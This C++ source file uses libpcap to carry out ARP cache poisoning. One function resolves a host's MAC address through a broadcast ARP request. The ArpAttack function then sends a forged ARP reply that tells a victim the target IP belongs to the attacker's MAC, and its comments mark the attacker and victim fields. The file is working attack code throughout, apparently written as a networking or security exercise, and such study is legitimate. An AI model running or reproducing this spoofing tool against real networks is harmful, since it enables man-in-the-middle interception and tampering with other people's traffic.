#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

#include <arpa/inet.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h> 
#include <sys/socket.h>

#include <unistd.h>
#include <cstring>
#include <cstdio>
#include <pcap.h>

#include "mac.h"
#include "ip.h"
#include "ethhdr.h"
#include "arphdr.h"

#define MAC_ALEN 6

extern Mac my_Mac;
extern Ip my_Ip;

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

Mac GetMacFromIP(pcap_t* handle, const char* ipAddr){
    
    //request_packet
    EthArpPacket req_packet;

	req_packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	req_packet.eth_.smac_ = my_Mac;// attacker mac
	req_packet.eth_.type_ = htons(EthHdr::Arp);

	req_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	req_packet.arp_.pro_ = htons(EthHdr::Ip4);
	req_packet.arp_.hln_ = Mac::SIZE;
	req_packet.arp_.pln_ = Ip::SIZE;
	req_packet.arp_.op_ = htons(ArpHdr::Request);
	req_packet.arp_.smac_ = my_Mac; // attacker mac
	req_packet.arp_.sip_ = htonl(my_Ip);  
	req_packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); 
	req_packet.arp_.tip_ = htonl(Ip(ipAddr));

    //send packet to get sender MAC addr
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&req_packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

    //reply_packet
    EthArpPacket *rep_packet;

    while (1) {
        struct pcap_pkthdr* header;
	    const u_char* packet;

        int res = pcap_next_ex(handle, &header, &packet);//get the latest packet data
        if (res == 0) continue;
        if (res == -1 || res == -2) { // -1=error while reading packet -2=EOF 0=timeout
            printf ("Getting last packet Error!\n");
			exit(0);
        }
        rep_packet = (EthArpPacket*)packet;
        if((rep_packet->eth_.type_ == htons(EthHdr::Arp)) && (rep_packet->arp_.op_ == htons(ArpHdr::Reply))){
            return rep_packet->arp_.smac_; //check if it is Arp and Reply before getting Mac addr
        }
    }
}

void ArpAttack(pcap_t* handle, const Mac my_Mac, const char* send_Ip, const char* tar_Ip){

    Mac send_Mac = GetMacFromIP(handle, send_Ip);
    Mac tar_Mac = GetMacFromIP(handle, tar_Ip);

    printf("Sender Ip: %s\n", send_Ip);
    printf("Sender Mac: %s\n",send_Mac.operator std::string().c_str());

    printf("Target Ip: %s\n", tar_Ip);
    printf("Target Mac: %s\n",tar_Mac.operator std::string().c_str());

    EthArpPacket att_packet;

    att_packet.eth_.dmac_ = send_Mac;// victim mac
    att_packet.eth_.smac_ = my_Mac;// attacker mac
    att_packet.eth_.type_ = htons(EthHdr::Arp);

    att_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    att_packet.arp_.pro_ = htons(EthHdr::Ip4);
    att_packet.arp_.hln_ = Mac::SIZE;
    att_packet.arp_.pln_ = Ip::SIZE;
    att_packet.arp_.op_ = htons(ArpHdr::Reply);
    att_packet.arp_.smac_ = my_Mac;// attacker mac(changed)
    att_packet.arp_.sip_ = htonl(Ip(tar_Ip));// target ip addr
    att_packet.arp_.tmac_ = send_Mac;// victim mac
    att_packet.arp_.tip_ = htonl(Ip(send_Ip));// victim ip addr

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&att_packet), sizeof(EthArpPacket));
    if (res != 0) {
    	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

}